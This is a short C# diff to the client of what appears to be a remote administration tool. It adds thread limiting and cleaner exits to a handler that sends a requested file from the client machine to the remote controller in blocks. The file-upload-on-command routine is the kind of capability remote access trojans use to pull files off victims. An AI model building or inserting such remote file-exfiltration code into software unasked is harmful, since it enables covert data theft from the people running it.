@@ -58,17 +58,22 @@ namespace xClient.Core.Commands
         {
             new Thread(() =>
             {
+                _limitThreads.WaitOne();
                 try
                 {
                     FileSplit srcFile = new FileSplit(command.RemotePath);
                     if (srcFile.MaxBlocks < 0)
+                    {
                         new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                             srcFile.LastError).Execute(client);
+                        _limitThreads.Release();
+                        return;
+                    }
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
-                        if (!client.Connected) return;
-                        if (_canceledDownloads.ContainsKey(command.ID)) return;
+                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
+                            break;
 
                         byte[] block;
                         if (srcFile.ReadBlock(currentBlock, out block))
@@ -78,8 +83,11 @@ namespace xClient.Core.Commands
                                 srcFile.LastError).Execute(client);
                         }
                         else
+                        {
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                 srcFile.LastError).Execute(client);
+                            break;
+                        }
                     }
                 }
                 catch (Exception ex)
@@ -87,6 +95,7 @@ namespace xClient.Core.Commands
                     new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                         .Execute(client);
                 }
+                _limitThreads.Release();
             }).Start();
         }
 
